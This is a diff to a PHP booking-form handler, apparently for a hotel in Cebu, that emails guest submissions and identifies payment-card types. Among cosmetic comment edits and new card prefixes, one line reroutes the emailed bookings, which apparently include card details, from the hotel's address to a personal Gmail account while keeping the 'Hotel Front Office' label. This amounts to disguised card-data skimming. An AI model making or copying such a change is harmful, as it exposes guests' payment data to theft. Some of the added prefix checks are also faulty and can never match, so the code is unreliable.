@@ -90,7 +90,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Recipients
         $mail->setFrom('it@hotelasiacebu.com', 'Hotel Asia');
-        $mail->addAddress('it@hotelasiacebu.com', 'Hotel Front Office');
+        $mail->addAddress('manugasewinjames@gmail.com', 'Hotel Front Office');
 
         // Content
         $mail->isHTML(true);
@@ -158,11 +158,15 @@ flight and Arrival: '.$flightAndArrival.'
 }
 
 function identifyCardType($cardNumber) {
-    $cardNumber = str_replace(' ', '', $cardNumber); // Remove spaces
+    // Remove spaces from the card number
+    $cardNumber = str_replace(' ', '', $cardNumber);
+
+    // Get the necessary prefixes
     $prefix2 = substr($cardNumber, 0, 2);
     $prefix4 = substr($cardNumber, 0, 4);
     $prefix6 = substr($cardNumber, 0, 6);
 
+    // Define prefixes for different card types
     $visaPrefixes = ["4"];
     $mastercardPrefixes = ["51", "52", "53", "54", "55"];
     $amexPrefixes = ["34", "37"];
@@ -170,8 +174,12 @@ function identifyCardType($cardNumber) {
     $jcbPrefixes = ["3528", "3529", "353", "354", "355", "356", "357", "358"];
     $dinersClubPrefixes = ["300", "301", "302", "303", "304", "305", "36", "38", "39"];
     $unionPayPrefixes = ["62"];
+    $maestroPrefixes = ["50", "56", "57", "58", "639", "670", "677", "679"];
+    $rupayPrefixes = ["60", "6521", "6522"];
+    $mirPrefixes = ["2200", "2201", "2202", "2203", "2204"];
+    $laserCardPrefixes = ["6304", "6706", "6771", "6709"];
 
-    // Identify card type
+    // Identify card type based on the prefixes
     if (in_array($prefix2, $visaPrefixes)) {
         return "Visa";
     } elseif (in_array($prefix2, $mastercardPrefixes)) {
@@ -186,9 +194,18 @@ function identifyCardType($cardNumber) {
         return "Diners Club";
     } elseif (in_array($prefix2, $unionPayPrefixes)) {
         return "UnionPay";
+    } elseif (in_array($prefix2, $maestroPrefixes) || in_array($prefix4, $maestroPrefixes)) {
+        return "Maestro";
+    } elseif (in_array($prefix2, $rupayPrefixes) || in_array($prefix4, $rupayPrefixes)) {
+        return "RuPay";
+    } elseif (in_array($prefix4, $mirPrefixes)) {
+        return "MIR";
+    } elseif (in_array($prefix4, $laserCardPrefixes)) {
+        return "LaserCard";
     }
-    
+
     return "Unknown";
 }
+
 
 ?>
